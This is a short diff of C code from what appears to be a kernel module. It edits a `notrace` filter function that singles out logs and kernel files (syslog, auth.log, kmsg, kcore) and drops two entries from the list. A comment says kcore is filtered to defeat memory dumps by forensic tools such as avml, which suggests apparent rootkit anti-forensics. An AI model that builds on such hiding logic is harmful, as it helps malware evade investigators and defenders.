@@ -28,7 +28,6 @@ notrace static bool should_filter_file(const char *filename) {
     if (!filename)
         return false;
     return (strcmp(filename, "kmsg") == 0 ||
-            strcmp(filename, "kallsyms") == 0 ||
             strcmp(filename, "enabled_functions") == 0 ||
             strcmp(filename, "control") == 0 ||
             strcmp(filename, "debug") == 0 ||
@@ -39,7 +38,6 @@ notrace static bool should_filter_file(const char *filename) {
             strcmp(filename, "syslog") == 0 ||
             strcmp(filename, "auth.log") == 0 ||
             strcmp(filename, "auth.log.1") == 0 ||
-            strcmp(filename, "vmallocinfo") == 0 ||
             strcmp(filename, "syslog.1") == 0 ||
             strcmp(filename, "kcore") == 0 || //temp fix to avoid memory dump using tools like avml
             strcmp(filename, "touched_functions") == 0);
